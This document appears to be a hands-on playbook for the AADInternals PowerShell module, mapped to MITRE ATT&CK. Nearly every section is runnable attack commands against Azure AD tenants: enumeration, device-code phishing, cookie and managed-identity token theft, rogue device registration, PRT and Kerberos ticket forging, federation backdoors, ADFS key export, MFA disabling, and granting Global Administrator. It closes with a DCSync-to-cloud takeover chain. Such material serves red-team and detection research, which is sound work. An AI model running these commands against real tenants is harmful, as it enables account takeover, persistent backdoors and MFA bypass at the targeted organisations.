# AADInternals — Hands-On Use Cases

Every command below is a real, `AADInt`-prefixed cmdlet verified against [`Gerenios/AADInternals`](https://github.com/Gerenios/AADInternals) source (`master`, module version `0.9.8`). MITRE ATT&CK IDs are tagged per scenario — several are this repo's own best-judgment mapping onto the closest matching technique/sub-technique where AADInternals isn't cited in a specific procedure example, flagged inline where that's the case.

## Contents
- [Unauthenticated Tenant Reconnaissance](#unauthenticated-tenant-reconnaissance)
- [Bulk Username / Guest-Account Enumeration](#bulk-username--guest-account-enumeration)
- [Reading an ADFS Server's Application Inventory With No Auth](#reading-an-adfs-servers-application-inventory-with-no-auth)
- [Acquiring Access Tokens — Interactive, ROPC, and Device Code](#acquiring-access-tokens--interactive-ropc-and-device-code)
- [Device-Code Phishing](#device-code-phishing)
- [Extracting a Browser's Persistent Sign-In Cookie](#extracting-a-browsers-persistent-sign-in-cookie)
- [Stealing a Managed-Identity Token via IMDS](#stealing-a-managed-identity-token-via-imds)
- [Registering a Rogue Device and Deriving a PRT](#registering-a-rogue-device-and-deriving-a-prt)
- [Forging and Replaying a Primary Refresh Token](#forging-and-replaying-a-primary-refresh-token)
- [Bulk PRT (BPRT) Abuse](#bulk-prt-bprt-abuse)
- [Overwriting a Device's Windows Hello for Business Key](#overwriting-a-devices-windows-hello-for-business-key)
- [Desktop SSO Ticket Forging — On-Prem Hash to Any-User Cloud Login](#desktop-sso-ticket-forging--on-prem-hash-to-any-user-cloud-login)
- [Cloud-Side Desktop SSO Backdoor (Set-DesktopSSO)](#cloud-side-desktop-sso-backdoor-set-desktopsso)
- [Azure AD Connect Sync Service Account Backdoor](#azure-ad-connect-sync-service-account-backdoor)
- [Federation Backdoor — ConvertTo-Backdoor](#federation-backdoor--converttobackdoor)
- [Exporting ADFS Certificates From a Compromised Server](#exporting-adfs-certificates-from-a-compromised-server)
- [Disabling a User's Legacy Per-User MFA](#disabling-a-users-legacy-per-user-mfa)
- [Resetting a Password and Granting Global Administrator](#resetting-a-password-and-granting-global-administrator)
- [Dumping Azure AD Connect Sync Configuration](#dumping-azure-ad-connect-sync-configuration)
- [Chained Workflow — On-Prem DCSync to Full Cloud Tenant Access](#chained-workflow--on-prem-dcsync-to-full-cloud-tenant-access)

---

## Unauthenticated Tenant Reconnaissance

**MITRE ATT&CK:** T1589.002/.003 (Gather Victim Identity Information), T1590.005 (Gather Victim Network Information: IP Addresses/DNS), T1526 (Cloud Service Discovery)

No credential of any kind is required. This is usually the first command run against any target domain.

```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals

Invoke-AADIntReconAsOutsider -DomainName "victim.com" | Format-Table

# Also pull ADFS relaying parties (application inventory) if the tenant is federated
Invoke-AADIntReconAsOutsider -DomainName "victim.com" -GetRelayingParties | Format-Table
```

Output includes tenant ID/brand/region, per-domain DNS/MX/SPF/DMARC/DKIM/MTA-STS status, Desktop SSO enablement, Microsoft Defender for Identity instance presence, and whether the tenant uses Azure AD cloud sync — all from public endpoints, none of it a logged sign-in (see `03/04` for why this is evidentially invisible on the target side).

## Bulk Username / Guest-Account Enumeration

**MITRE ATT&CK:** T1589.002 (Gather Victim Identity Information: Email Addresses)

```powershell
$users = Get-Content .\candidates.txt   # one UPN per line

Invoke-AADIntUserEnumerationAsOutsider -UserName $users | Where-Object Exists -eq $true
```

Internally each entry is checked via `login.microsoftonline.com/common/GetCredentialType`, the same call the O365 login page itself makes — `IfExistsResult` of `0` or `6` means the account exists, `1` means it doesn't. Guest accounts appear as `<upn>#EXT#@tenant.onmicrosoft.com`, letting this same technique fingerprint third-party organizations that have been invited as guests into the target tenant.

## Reading an ADFS Server's Application Inventory With No Auth

**MITRE ATT&CK:** T1590.005 (Gather Victim Network Information), T1526 (Cloud Service Discovery)

```powershell
Invoke-AADIntReconAsOutsider -DomainName "victim.com" -GetRelayingParties | Select-Object -ExpandProperty RPS
```

Only works if the tenant's ADFS server exposes `idpinitiatedsignon.aspx` (a common default) — returns the display name of every relying-party trust configured on that ADFS server, effectively an unauthenticated inventory of every federated application the organization uses.

## Acquiring Access Tokens — Interactive, ROPC, and Device Code

**MITRE ATT&CK:** T1078.004 (Valid Accounts: Cloud Accounts), T1550.001 (Use Alternate Authentication Material: Application Access Token)

```powershell
# Interactive (MSAL popup)
$at = Get-AADIntAccessTokenForMSGraph

# ROPC — username+password directly, no interactive prompt (blocked by CA if
# legacy-auth/ROPC is disabled for the tenant)
$cred = Get-Credential
$at   = Get-AADIntAccessTokenForAADGraph -Credentials $cred

# Save into AADInternals' own cache for reuse across subsequent cmdlets
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Save a token into the REAL Microsoft Graph PowerShell SDK's cache — the
# token then persists as if Connect-MgGraph had been run normally
Get-AADIntAccessTokenForMSGraph -SaveToMgCache
```

## Device-Code Phishing

**MITRE ATT&CK:** T1566.002 (Phishing: Spearphishing Link), T1528 (Steal Application Access Token)

```powershell
Get-AADIntAccessTokenUsingDeviceCode
# Prints a real https://microsoft.com/devicelogin URL + one-time code —
# send that code to a target via any channel (email, Teams, SMS)

# Or automate the send with the module's own phishing helper against a list
Invoke-AADIntPhishing -Users (Get-Content .\targets.txt) -Type MFA
```

Device-code flow is a genuine Microsoft-documented OAuth grant — nothing about the request itself is anomalous; only the delivery mechanism (an unsolicited code from an unexpected sender) is the phishing element.

## Extracting a Browser's Persistent Sign-In Cookie

**MITRE ATT&CK:** T1539 (Steal Web Session Cookie)

```powershell
# Run on a host where the target already has an active browser session
$cookie = Get-AADIntESTSAUTHCookie

# Decrypt/parse an exported ESTSAUTH cookie value
Unprotect-AADIntEstsAuthPersistentCookie -Cookie $cookie
```

## Stealing a Managed-Identity Token via IMDS

**MITRE ATT&CK:** T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

```powershell
# Run from code execution already established on an Azure VM/App Service/
# Function with a managed identity attached
Get-AADIntAccessTokenUsingIMDS -Resource "https://graph.microsoft.com"
```

## Registering a Rogue Device and Deriving a PRT

**MITRE ATT&CK:** T1098.005 (Account Manipulation: Device Registration)

```powershell
# Get a token scoped for AAD device join, using a compromised user's creds
Get-AADIntAccessTokenForAADJoin -SaveToCache

Join-AADIntAzureAD -DeviceName "Attacker-Laptop" -DeviceType "Windows" -OSVersion "10.0.19045.0"
# Successfully registers a new device object in Azure AD; returns a
# device certificate (.pfx) and the device's local + additional SIDs
```

The new device is fully legitimate from Azure AD's perspective — a persistent, attacker-controlled identity that doesn't require the target user's password to keep working afterward.

## Forging and Replaying a Primary Refresh Token

**MITRE ATT&CK:** T1528 (Steal Application Access Token), T1550.001 (Use Alternate Authentication Material: Application Access Token)

```powershell
$creds   = Get-Credential
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\Attacker-Laptop.pfx -Credentials $creds

$prtToken = New-AADIntUserPRTToken -RefreshToken $prtKeys.refresh_token -SessionKey $prtKeys.session_key

# Exchange the forged PRT for a resource-scoped access token — no MFA
# prompt, since the PRT itself is treated as strong/device-bound auth
$at = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```

## Bulk PRT (BPRT) Abuse

**MITRE ATT&CK:** T1098.005 (Account Manipulation: Device Registration)

```powershell
$bprt = New-AADIntBulkPRTToken -RefreshToken $prtKeys.refresh_token -SessionKey $prtKeys.session_key
# BPRTs are meant for kiosk/mass-provisioning scenarios and can register
# many devices from a single stolen token — the author's own research
# ("BPRT unleashed") flags this as a potential denial-of-service vector
# against the tenant's device-registration quota as well as a persistence
# primitive.
```

## Overwriting a Device's Windows Hello for Business Key

**MITRE ATT&CK:** T1556.006 (Modify Authentication Process: Multi-Factor Authentication)

```powershell
Set-AADIntDeviceWHfBKey -AccessToken $at -DeviceId <device-guid> -PublicKey <attacker-generated public key>
# The device now accepts the attacker's private key as a valid WHfB
# authenticator for the target user, without touching a password
```

## Desktop SSO Ticket Forging — On-Prem Hash to Any-User Cloud Login

**MITRE ATT&CK:** T1558 (Steal or Forge Kerberos Tickets), T1606 (Forge Web Credentials), T1556.006 (Modify Authentication Process: MFA)

Requires the AZUREADSSOACC$ computer account's NT hash, normally obtained on-prem via a DCSync-capable tool (see `Mimikatz/lsadump (DCSync)/`) — **no cloud credential is used anywhere in this chain**.

```powershell
# Step 1 (on-prem, separate tool): dump AZUREADSSOACC$'s NT hash, e.g. via
# Mimikatz — lsadump::dcsync /user:AZUREADSSOACC$

# Step 2: resolve the target user's SID (from on-prem AD, or via an
# authenticated AADInternals lookup if only the cloud object is reachable)
$sid = (Get-ADUser -Identity "targetuser").SID.Value

# Step 3: forge the Kerberos ticket
$ticket = New-AADIntKerberosTicket -Hash "<AZUREADSSOACC$ NT hash, hex>" -SidString $sid

# Step 4: exchange the forged ticket for a real Azure AD access token —
# a full, MFA-free authenticated session as the target user
$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $ticket
```

## Cloud-Side Desktop SSO Backdoor (Set-DesktopSSO)

**MITRE ATT&CK:** T1098 (Account Manipulation), T1556.006 (Modify Authentication Process: MFA)

Requires an existing Global Administrator token — this path needs no on-prem access, at the cost of desyncing the cloud and on-prem copies of the AZUREADSSOACC$ key unless the operator also updates AD.

```powershell
$pt = Get-AADIntAccessTokenForPTA -Credentials $globalAdminCreds

Set-AADIntDesktopSSO -AccessToken $pt -DomainName "victim.com" -Password "AttackerKnownPassw0rd!"
# Prompts: "Would you like to set the password ... also in your ON-PREM
# ACTIVE DIRECTORY (yes/no)?" — answering "no" leaves the change cloud-only
```

## Azure AD Connect Sync Service Account Backdoor

**MITRE ATT&CK:** T1098 (Account Manipulation), T1136.003 (Create Account: Cloud Account)

A **distinct** technique from the Desktop SSO backdoor above — this creates/resets the account the sync engine itself uses, which carries the `DirectorySynchronizationAccount` role.

```powershell
$pt = Get-AADIntAccessTokenForAADGraph -Credentials $globalAdminCreds

Reset-AADIntServiceAccount -AccessToken $pt -ServiceAccount "myserviceaccount"
# Returns a freshly (re)set UserName/Password pair with sync-privileged
# access to the tenant
```

## Federation Backdoor — ConvertTo-Backdoor

**MITRE ATT&CK:** T1484.002 (Domain or Tenant Policy Modification: Trust Modification), T1606.002 (Forge Web Credentials: SAML Tokens)

Requires Global Administrator. This is the technique behind this page's 🔴 red flag — the certificate used is hardcoded and identical across every AADInternals install.

```powershell
$pt = Get-AADIntAccessTokenForAADGraph -Credentials $globalAdminCreds

ConvertTo-AADIntBackdoor -AccessToken $pt -DomainName "victim.myo365.site" -Force
# Domain           IssuerUri
# ------           ---------
# victim.myo365.site  http://any.sts/B231A11F

# Later, from anywhere, with no further tenant access:
Open-AADIntOffice365Portal -DomainName "victim.myo365.site" -UserName "ceo@victim.com"
# Logs in as ceo@victim.com with a SAML token signed by the shipped
# any_sts.pfx private key — MFA and Conditional Access are bypassed
# because the federated IdP (now the attacker) is trusted to have
# already satisfied them
```

## Exporting ADFS Certificates From a Compromised Server

**MITRE ATT&CK:** T1552.004 (Unsecured Credentials: Private Keys), T1606.002 (Forge Web Credentials: SAML Tokens)

```powershell
# Run locally on a compromised ADFS server with admin rights
Export-AADIntADFSCertificates
# Dumps the token-signing and token-decryption certificates directly from
# the ADFS configuration database/DKM container — usable afterward for
# offline SAML token forging against every domain trusting that ADFS instance
```

## Disabling a User's Legacy Per-User MFA

**MITRE ATT&CK:** T1556.006 (Modify Authentication Process: Multi-Factor Authentication)

```powershell
$pt = Get-AADIntAccessTokenForAADGraph -Credentials $globalAdminCreds

Set-AADIntUserMFA -AccessToken $pt -UserPrincipalName "target@victim.com" -State Disabled
```

This only affects legacy **per-user enabled/enforced** MFA (the old "Multi-Factor Auth" admin page), which is a distinct control from modern Conditional-Access-based MFA — it will not remove MFA that a CA policy enforces independently.

## Resetting a Password and Granting Global Administrator

**MITRE ATT&CK:** T1098 (Account Manipulation), T1098.003 (Account Manipulation: Additional Cloud Roles)

```powershell
$pt = Get-AADIntAccessTokenForAADGraph -Credentials $globalAdminCreds

Reset-AADIntUserPasswordByUpn -AccessToken $pt -UserPrincipalName "backdoor@victim.com" -Password "N3wP@ssw0rd!"

$role = Get-AADIntRoleByName -AccessToken $pt -Name "Company Administrator"  # Global Admin's internal role name
Add-AADIntRoleMembers -AccessToken $pt -RoleObjectId $role.ObjectId -Members "backdoor@victim.com"
```

## Dumping Azure AD Connect Sync Configuration

**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials In Files)

```powershell
# Run locally on a compromised Azure AD Connect server
$pt = Get-AADIntAccessTokenForAADGraph -SaveToCache

Get-AADIntSyncConfiguration -AccessToken $pt
Get-AADIntSyncObjects -AccessToken $pt   # full synced-object/attribute-mapping dump
```

## Chained Workflow — On-Prem DCSync to Full Cloud Tenant Access

**MITRE ATT&CK:** T1003.006 (OS Credential Dumping: DCSync), T1558 (Steal or Forge Kerberos Tickets), T1078.004 (Valid Accounts: Cloud Accounts)

The single most consequential real-world chain this tool enables — matches the pattern Microsoft's own reporting attributes to Storm-0501 (see `01 - Overview.md`).

```powershell
# 1. On-prem: Mimikatz DCSync against AZUREADSSOACC$ (see Mimikatz/lsadump (DCSync)/)
#    mimikatz # lsadump::dcsync /user:AZUREADSSOACC$

# 2. Resolve a high-value cloud target's SID (Global Admin's on-prem-synced object)
$sid = (Get-ADUser -Identity "ga-admin").SID.Value

# 3. Forge the Desktop SSO ticket entirely offline
$ticket = New-AADIntKerberosTicket -Hash "<hash from step 1>" -SidString $sid

# 4. Exchange for a live Azure AD Graph / MS Graph token as the Global Admin
$at = Get-AADIntAccessTokenForMSGraph -KerberosTicket $ticket

# 5. From here, pivot into any cloud-native technique above — federation
#    backdoor, role grants, MFA disablement — now fully authenticated as
#    a real Global Administrator, with the on-prem compromise as the only
#    "cloud credential" ever used
```
